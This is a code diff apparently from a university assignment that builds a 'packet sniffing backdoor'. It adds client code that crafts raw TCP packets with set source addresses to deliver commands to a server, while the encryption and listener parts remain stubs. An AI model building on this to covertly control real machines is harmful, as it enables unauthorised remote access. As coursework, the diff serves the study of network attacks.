@@ -31,6 +31,10 @@
 
 int main(int argc, char **argv){
 
+    /* Make sure is root user */
+    
+    
+
     /* Parse arguments */
     
     int is_server = 0;
@@ -99,9 +103,23 @@ void client(struct client_opt c_opt){
     
     /* Encrypt command */
     
-    /* Set packet options */
+    /* Set packet options and send packet */
     
-    /* Send packet */
+    struct addr_info user_addr;
+    user_addr.shost = DEFAULT_SRC_IP;
+    user_addr.sport = DEFAULT_SRC_PORT;
+    user_addr.dhost = c_opt.target_host;
+    user_addr.dport = c_opt.target_port;
+    user_addr.raw_socket = 0;
+    
+    // Create a raw socket and set SO_REUSEADDR
+    user_addr.raw_socket = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    int arg = 1;
+    if(setsockopt(user_addr.raw_socket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1)
+	    system_fatal("setsockopt");
+    
+    // Send packet
+    send_datagram(&user_addr);
     
     /* Listen for results and print */
 }
@@ -145,16 +163,16 @@ int send_datagram(struct addr_info *user_addr){
     struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
     struct sockaddr_in sin;
     pseudo_header psh;
-
+    
     sin.sin_family = AF_INET;
     sin.sin_port = htons(user_addr->dport);
     sin.sin_addr.s_addr = inet_addr(user_addr->dhost);
     
     // Zero out the buffer where the datagram will be stored
-    memset(datagram, 0, PKT_SIZE); 
- 
+    memset(datagram, 0, PKT_SIZE);
+
     /* IP header */
-    
+
     iph->ihl = 5;
     iph->version = 4;
     iph->tos = 0;
@@ -171,8 +189,8 @@ int send_datagram(struct addr_info *user_addr){
  
     /* TCP header */
     
-    tcph->source = htons (user_addr->sport);
-    tcph->dest = htons (user_addr->dport);
+    tcph->source = htons(user_addr->sport);
+    tcph->dest = htons(user_addr->dport);
     tcph->seq = 0;
     tcph->ack_seq = 0;
     tcph->doff = 5; // Data Offset is set to the TCP header length 
@@ -204,17 +222,17 @@ int send_datagram(struct addr_info *user_addr){
         int one = 1;
         const int *val = &one;
         if (setsockopt (user_addr->raw_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
-            perror ("setsockopt");
+            system_fatal("setsockopt");
     }
  
     /* Send the packet */
     
     if(sendto(user_addr->raw_socket, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0){
-        perror ("sendto");
+        system_fatal("sendto");
         return -1;
     }
     else{ //Data sent successfully
-        printf ("Datagram Sent!\n");
+        printf("Sent command!\n");
         return 0;
     }
 }
@@ -247,6 +265,7 @@ void packet_handler(){
 void usage(){
     
     printf("\n");
+    printf("COMP 8505 Assignment 2 - Packet Sniffing Backdoor\n");
     printf("Usage: ./backdoor [OPTIONS]\n");
     printf("---------------------------\n");
     printf("  -h                Display this help.\n");
@@ -257,4 +276,16 @@ void usage(){
     printf("SERVER\n");
     printf("  -s                Enables server mode. No other options necessary.\n");
     printf("\n");
+}
+
+/*
+| ------------------------------------------------------------------------------
+| Fatal error
+| ------------------------------------------------------------------------------
+*/
+
+// Prints the error stored in errno and aborts the program.
+static void system_fatal(const char* message) {
+    perror(message);
+    exit(EXIT_FAILURE);
 }
